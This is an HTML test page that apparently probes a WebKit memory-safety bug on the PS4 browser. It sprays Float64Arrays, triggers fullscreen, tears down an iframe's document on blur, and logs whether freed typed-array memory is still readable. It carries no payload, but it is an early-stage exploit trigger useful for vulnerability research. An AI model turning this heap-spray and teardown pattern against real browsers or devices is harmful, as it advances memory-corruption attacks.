<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Blur + Float64Array</title>
<style>
body { background:black; color:#0f0; font-family:monospace; }
iframe { width:100%; height:320px; border:1px solid #0f0; }
button { font-size:16px; margin:4px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>

<body>

<h3>Parent Logger</h3>

<button onclick="runTest('A')">TEST A</button>
<button onclick="runTest('B')">TEST B</button>
<button onclick="runTest('C')">TEST C</button>
<button onclick="runTest('D')">TEST D</button>

<div id="log"></div>
<iframe id="frame"></iframe>

<script>
function plog(m){
  document.getElementById("log").textContent += m + "\n";
}

plog("[PARENT] Loaded");

window.addEventListener("message", function(e){
  if(e.data && e.data.log){
    plog("[MSG] " + e.data.log);
  }
});

function runTest(mode){
  document.getElementById("log").textContent="";
  plog("=== START TEST "+mode+" ===");

  var f = document.getElementById("frame");
  f.src = "about:blank";

  f.onload = function(){
    var d = f.contentDocument;
    f.contentWindow.name = mode;
    d.open();
    d.write(IFRAME_HTML);
    d.close();
  };
}

var IFRAME_HTML =
'<!DOCTYPE html><html><body style="background:black;color:#0f0;font-family:monospace;">'+
'<button id="start">START</button>'+
'<script>'+
'function send(m){ parent.postMessage({log:m},"*"); }'+
'var buffer=null, f64=null, spray=[];'+

'send("[IFRAME] Loaded");'+

'function snapshot(tag){'+
' send("[SNAPSHOT] "+tag);'+
' try{'+
'  send(" f64.length="+(f64?f64.length:null));'+
'  send(" f64[0]="+(f64?f64[0]:null));'+
'  send(" buffer.byteLength="+(buffer?buffer.byteLength:null));'+
' }catch(e){ send(" snapshot exception"); }'+
'}'+

'document.getElementById("start").onclick=function(){'+
' send("[START] clicked");'+

' buffer = new ArrayBuffer(64);'+
' f64 = new Float64Array(buffer);'+
' f64[0]=13.37;'+
' for(var i=0;i<500;i++){ spray.push(new Float64Array(8)); }'+

' send("[ALLOC] Float64Array length="+f64.length);'+
' send("[SPRAY] alive="+spray.length);'+

' var mode = window.name;'+
' if(mode==="B"){ send("[REGISTER] DataView"); window.dv=new DataView(buffer); }'+
' if(mode==="C"){ send("[REGISTER] postMessage transfer"); parent.postMessage(buffer,"*",[buffer]); }'+
' if(mode==="D"){ send("[REGISTER] structuredClone"); try{structuredClone(f64);}catch(e){} }'+

' snapshot("before fullscreen");'+
' document.documentElement.webkitRequestFullscreen();'+
'};'+

'window.onblur=function(){'+
' send("[EVENT] blur detected");'+
' snapshot("after blur");'+
' send("[TEARDOWN] document.write iframe");'+
' document.open(); document.write("<h3>teardown</h3>"); document.close();'+
'};'+
'<\/script></body></html>';
</script>

</body>
</html>
